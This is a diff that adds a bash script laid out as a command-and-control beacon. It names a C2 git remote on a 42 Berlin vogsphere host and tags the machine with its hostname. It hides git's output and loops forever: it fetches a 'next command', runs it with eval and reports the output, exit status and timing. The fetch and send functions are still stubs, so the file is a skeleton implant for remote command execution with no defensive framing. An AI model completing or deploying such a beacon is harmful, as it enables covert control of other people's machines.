@@ -1,0 +1,109 @@
+#!/usr/bin/env bash
+# Heavily uses bashisms, do not port to POSIX sh
+
+err () {
+	printf '\033[31m%s\033[m\n' "$*" >&2
+}
+
+warn () {
+	printf '\033[33m%s\033[m\n' "$*" >&2
+}
+
+debug () {
+	printf '\033[90m%s\033[m\n' "$*" >&2
+}
+
+C2="git@vogsphere.42berlin.de:vogsphere/intra-uuid-17a60d50-65e8-4462-b546-c09f7a20c21c-5663399-tischmid"
+BEACON_ID="$(hostname -s)" || BEACON_ID="${HOSTNAME%%.*}"
+[ -n "${BEACON_ID}" ] || { err "error setting beacon id"; exit 1; }
+POLL_RATE="1"
+unset CDPATH
+
+tmpdir="$(mktemp -d)" || { err "error creating tmpdir"; exit 1; }
+orig_dir="$(pwd)" || { warn "error changing to tmpdir (not exiting)"; }
+cd -- "${tmpdir}" || { err "error changing to tmpdir"; exit 1; }
+
+_grey () {
+	printf '\033[90m'
+}
+
+_rst () {
+	printf '\033[m'
+}
+
+_cleanup () {
+	printf '\n'
+	warn "Cleaning up..."
+	_grey
+	cd /
+	rm -rvf -- "${tmpdir}" || { err "error deleting tmpdir"; }
+	cd -- "${orig_dir}" || cd || cd -- "${HOME}" || cd -- ~ || pwd
+	_rst
+	warn "Exiting"
+} && trap _cleanup EXIT
+
+_fetch_next_command () {
+	printf '%s\n' "echo hi"
+}
+
+_send_result () {
+	echo "Sent!"
+}
+
+git () {
+	local subcomand
+
+	subcomand="${1}"
+	[ -n "${subcomand}" ] || { command git; return 1; }
+	shift
+	if [ "${DEBUG}" = "on" ]
+	then
+		_grey
+		command git "${subcomand}" "${@}"
+		_rst
+	else
+		2>/dev/null 1>&2 command git "${subcomand}" -q "${@}"
+	fi
+}
+
+# TODO: Make asynchronous, you don't want to lose the connection when you send a blocking/neverending command
+_fetch_eval () {
+	local cmd status pipestatus elapsed
+
+	cmd="$(_fetch_next_command ; printf .)"
+	cmd="${cmd%.}"
+	[ "${DEBUG}" = "on" ] && { debug "${cmd@A}"; return 1; }
+	[ -n "${cmd}" ] || return 1
+	SECONDS="0"
+	eval "${cmd}" 1>stdout 2>stderr
+	status="${?}"
+	pipestatus="${PIPESTATUS[@]@A}"
+	elapsed="${SECONDS}"
+	_send_result stdout stderr "${status}" "${pipestatus}" "${elapsed}"
+}
+
+init () {
+	git init
+	if [ "${DEBUG}" = "on" ]
+	then
+		_grey
+		pwd
+		ls -al
+		_rst
+	fi
+}
+
+loop () {
+	while :
+	do
+		_fetch_eval
+		sleep "${POLL_RATE}"
+	done
+}
+
+main () {
+	init
+	loop
+}
+
+main
